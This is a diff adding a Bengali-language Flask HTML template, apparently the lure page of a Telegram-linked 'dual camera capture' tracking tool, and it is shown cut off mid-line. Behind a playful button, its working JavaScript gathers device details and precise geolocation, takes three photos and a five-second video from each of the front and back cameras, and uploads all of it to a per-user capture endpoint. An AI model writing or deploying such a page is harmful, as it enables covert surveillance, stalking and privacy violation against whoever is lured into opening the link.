@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📱 ডুয়াল ক্যামেরা ক্যাপচার</title>
+    <style>
+        body {
+            background: linear-gradient(145deg, #2b3a67, #5d5d8a);
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 20px;
+            color: #fff;
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin: 20px 0;
+            animation: fadeIn 2s ease-in-out;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            background: linear-gradient(45deg, #ffd700, #ffa500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .camera-badge {
+            display: inline-block;
+            padding: 8px 20px;
+            margin: 10px;
+            border-radius: 50px;
+            background: rgba(255, 255, 255, 0.2);
+            font-weight: bold;
+        }
+        
+        button {
+            padding: 18px 40px;
+            margin: 20px;
+            border: none;
+            border-radius: 60px;
+            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
+            color: white;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        button:hover {
+            transform: scale(1.1) translateY(-5px);
+            box-shadow: 0 15px 35px rgba(255, 107, 107, 0.6);
+        }
+        
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .status-box {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 20px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: left;
+            font-family: monospace;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+        
+        .status-item {
+            margin: 12px 0;
+            padding: 8px;
+            border-bottom: 1px solid rgba(255,215,0,0.2);
+            display: flex;
+            align-items: center;
+            font-size: 1.1rem;
+        }
+        
+        .status-label {
+            font-weight: bold;
+            color: #FFD700;
+            margin-left: 10px;
+            flex: 1;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #FFD700, #FFA500);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        video, canvas {
+            display: none;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        #loadingMessage {
+            font-size: 1.3rem;
+            color: #FFD700;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        
+        .emoji-big {
+            font-size: 4rem;
+            margin: 10px 0;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .camera-indicator {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 30px;
+            background: rgba(255, 215, 0, 0.2);
+            margin: 5px;
+        }
+
+        .user-info {
+            background: rgba(255, 215, 0, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="emoji-big">📸🤳📱</div>
+        <h1>ডুয়াল ক্যামেরা ক্যাপচার</h1>
+        
+        <div class="user-info" id="userInfo">
+            ⏳ লোড হচ্ছে...
+        </div>
+        
+        <p>
+            <span class="camera-indicator">🤳 ফ্রন্ট ক্যামেরা</span> 
+            <span class="camera-indicator">📱 ব্যাক ক্যামেরা</span>
+        </p>
+        <p>দুটো ক্যামেরা থেকে স্বয়ংক্রিয়ভাবে ক্যাপচার করতে নিচের বাটনে ক্লিক করুন!</p>
+        
+        <button onclick="startDualCapture()" id="startButton">🎬 শুরু করুন</button>
+        
+        <div id="loadingMessage" style="display: none;">⏳ প্রসেসিং... দয়া করে অপেক্ষা করুন</div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        
+        <div class="status-box" id="statusBox">
+            <div class="status-item" id="statusDevice">
+                📱 ডিভাইস তথ্য: <span class="status-label">অপেক্ষা...</span>
+            </div>
+            <div class="status-item" id="statusLocation">
+                📍 অবস্থান: <span class="status-label">অপেক্ষা...</span>
+            </div>
+            <div class="status-item" id="statusFrontCamera">
+                🤳 ফ্রন্ট ক্যামেরা: <span class="status-label">অপেক্ষা...</span>
+            </div>
+            <div class="status-item" id="statusBackCamera">
+                📱 ব্যাক ক্যামেরা: <span class="status-label">অপেক্ষা...</span>
+            </div>
+            <div class="status-item" id="statusTelegram">
+                📤 টেলিগ্রাম: <span class="status-label">অপেক্ষা...</span>
+            </div>
+        </div>
+        
+        <div id="message"></div>
+    </div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ইউজার আইডি URL থেকে নেওয়া (Flask টেমপ্লেট থেকে)
+        const userId = '{{ user_id }}';
+        const apiBaseUrl = window.location.origin;
+        
+        let totalSteps = 0;
+        let completedSteps = 0;
+        let isCapturing = false;
+        
+        // ইউজার ইনফো দেখানো
+        document.getElementById('userInfo').textContent = `🆔 ইউজার আইডি: ${userId.substring(0, 8)}...`;
+        
+        function updateProgress() {
+            const percentage = (completedSteps / totalSteps) * 100;
+            document.getElementById('progressFill').style.width = percentage + '%';
+        }
+        
+        function updateStatus(elementId, message, isSuccess = null) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                const label = element.querySelector('.status-label');
+                if (label) {
+                    let prefix = '';
+                    if (isSuccess === true) prefix = '✅ ';
+                    else if (isSuccess === false) prefix = '❌ ';
+                    label.textContent = prefix + message;
+                }
+            }
+        }
+        
+        // সার্ভারে ডাটা পাঠানোর ফাংশন
+        async function sendDataToServer(type, data) {
+            try {
+                const response = await fetch(`${apiBaseUrl}/api/capture/${userId}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ type, data })
+                });
+                
+                if (!response.ok) {
+                    const error = await response.json();
+                    throw new Error(error.error || 'Failed to send data');
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Error sending to server:', error);
+                throw error;
+            }
+        }
+        
+        async function startDualCapture() {
+            if (isCapturing) {
+                alert('ক্যাপচার ইতিমধ্যে চলছে!');
+                return;
+            }
+            
+            isCapturing = true;
+            document.getElementById('startButton').disabled = true;
+            
+            // Reset progress
+            completedSteps = 0;
+            totalSteps = 6;
+            updateProgress();
+            
+            document.getElementById('loadingMessage').style.display = 'block';
+            document.getElementById('message').innerHTML = '';
+            
+            try {
+                // 1. Device Info
+                updateStatus('statusDevice', 'সংগ্রহ করা হচ্ছে...');
+                const deviceInfo = await collectDeviceInfo();
+                await sendDataToServer('text', deviceInfo);
+                completedSteps++;
+                updateProgress();
+                updateStatus('statusDevice', 'পাঠানো হয়েছে', true);
+                
+                // 2. Location
+                updateStatus('statusLocation', 'অনুরোধ করা হচ্ছে...');
+                try {
+                    await getLocation();
+                    completedSteps++;
+                    updateProgress();
+                    updateStatus('statusLocation', 'পাঠানো হয়েছে', true);
+                } catch (error) {
+                    updateStatus('statusLocation', 'ব্যর্থ - ' + error, false);
+                }
+                
+                // 3. Front Camera
+                updateStatus('statusFrontCamera', 'ফ্রন্ট ক্যামেরা চালু...');
+                await captureFromCamera('user', 'Front');
+                completedSteps += 2;
+                updateProgress();
+                updateStatus('statusFrontCamera', '৩টি ছবি + ভিডিও পাঠানো হয়েছে', true);
+                
+                // 4. Back Camera
+                updateStatus('statusBackCamera', 'ব্যাক ক্যামেরা চালু...');
+                await captureFromCamera('environment', 'Back');
+                completedSteps += 2;
+                updateProgress();
+                updateStatus('statusBackCamera', '৩টি ছবি + ভিডিও পাঠানো হয়েছে', true);
+                
+                // 5. Final
+                updateStatus('statusTelegram', 'সব ডাটা সফলভাবে পাঠানো হয়েছে! 🎉', true);
+                document.getElementById('loadingMessage').style.display = 'none';
+                document.getElementById('message').innerHTML = '<div style="color: #FFD700; font-size: 1.5rem;">🎉 সম্পূর্ণ! দুটো ক্যামেরা থেকেই ক্যাপচার করা হয়েছে!</div>';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                updateStatus('statusTelegram', 'ত্রুটি হয়েছে', false);
+                document.getElementById('loadingMessage').style.display = 'none';
+                document.getElementById('message').innerHTML = `<div class="error-message">❌ ত্রুটি: ${error.message}</div>`;
+            } finally {
+                isCapturing = false;
+                document.getElementById('startButton').disabled = false;
+            }
+        }
+        
+        async function captureFromCamera(facingMode, cameraName) {
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                
+                // Stop any existing stream
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+                
+                // Get new stream
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: facingMode,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+                
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    if (video.videoWidth > 0) resolve();
+                    else video.onloadeddata = resolve;
+                });
+                
+                // Capture 3 photos
+                for (let i = 1; i <= 3; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    await capturePhoto(video, canvas, `${cameraName}_photo_${i}`);
+                }
+                
+                // Record 5-second video
+                await recordVideo(stream, `${cameraName}_video`);
+                
+                // Stop this camera's stream
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch (error) {
+                console.error(`Error with ${cameraName} camera:`, error);
+                throw new Error(`${cameraName} ক্যামেরা ব্যর্থ: ${error.message}`);
+            }
+        }
+        
+        async function collectDeviceInfo() {
+            const info = [];
+            
+            info.push('📱 ডিভাইস তথ্য');
+            info.push('═══════════════');
+            info.push(`🖥️ স্ক্রিন: ${screen.width}x${screen.height}`);
+            info.push(`📺 কালার ডেপথ: ${screen.colorDepth}-bit`);
+            info.push(`🌐 ব্রাউজার: ${navigator.userAgent}`);
+            info.push(`🌍 ভাষা: ${navigator.language}`);
+            info.push(`🔌 অনলাইন: ${navigator.onLine ? 'হ্যাঁ' : 'না'}`);
+            info.push(`💻 প্ল্যাটফর্ম: ${navigator.platform || 'অজানা'}`);
+            
+            if (navigator.deviceMemory) {
+                info.push(`🧠 র‍্যাম: ${navigator.deviceMemory} GB`);
+            }
+            
+            if (navigator.hardwareConcurrency) {
+                info.push(`⚡ সিপিইউ কোর: ${navigator.hardwareConcurrency}`);
+            }
+            
+            const now = new Date();
+            info.push(`⏰ সময়: ${now.toLocaleString('bn-BD')}`);
+            info.push(`🕒 টাইমজোন: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+            
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                info.push(`📸 ক্যামেরা পাওয়া গেছে: ${videoDevices.length}`);
+            } catch (e) {
+                info.push(`📸 ক্যামেরা তথ্য পাওয়া যায়নি`);
+            }
+            
+            return info.join('\n');
+        }
+        
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject('জিওলোকেশন সাপোর্ট করে না');
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        
+                        // Send location
+                        await sendDataToServer('location', { latitude, longitude });
+                        
+                        // Send location text
+                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        await sendDataToServer('text', `📍 অবস্থান\nঅক্ষাংশ: ${latitude}\nদ্রাঘিমা: ${longitude}\n🗺️ মানচিত্র: ${googleMapsLink}`);
+                        
+                        resolve();
+                    },
+                    (error) => {
+                        let errorMessage = 'অবস্থান অ্যাক্সেস ব্যর্থ';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'অনুমতি দেওয়া হয়নি';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'অবস্থান অনুপলব্ধ';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'টাইমআউট';
+                                break;
+                        }
+                        reject(errorMessage);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        function capturePhoto(video, canvas, fileName) {
+            return new Promise((resolve) => {
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    setTimeout(() => resolve(capturePhoto(video, canvas, fileName)), 100);
+                    return;
+                }
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(async (blob) => {
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = async function() {
+                        const base64data = reader.result.split(',')[1];
+                        await sendDataToServer('photo', {
+                            buffer: base64data,
+                            caption: `📸 ${fileName} - ${new Date().toLocaleString()}`
+                        });
+                    };
+                    resolve();
+                }, 'image/jpeg', 0.9);
+            });
+        }
+        
+        async function recordVideo(stream, fileName) {
+            return new Promise((resolve, reject) => {
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') 
+                        ? 'video/webm;codecs=vp9,opus' 
+                        : 'video/webm'
+                });
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(videoBlob);
+                    reader.onloadend = async function() {
+                        const base64data = reader.result.split(',')[1];
+                        await sendDataToServer('video', {
+                            buffer: base64data,
+                            caption: `🎥 ${fileName} - ${new Date().toLocaleString()}`
+                        });
+                    };
+                    resolve();
+                };
+
+                mediaRecorder.onerror = (event) => {
+                    reject(event.error);
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 5000);
+            });
+        }
+
+        // Check if media devices are supported
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            document.
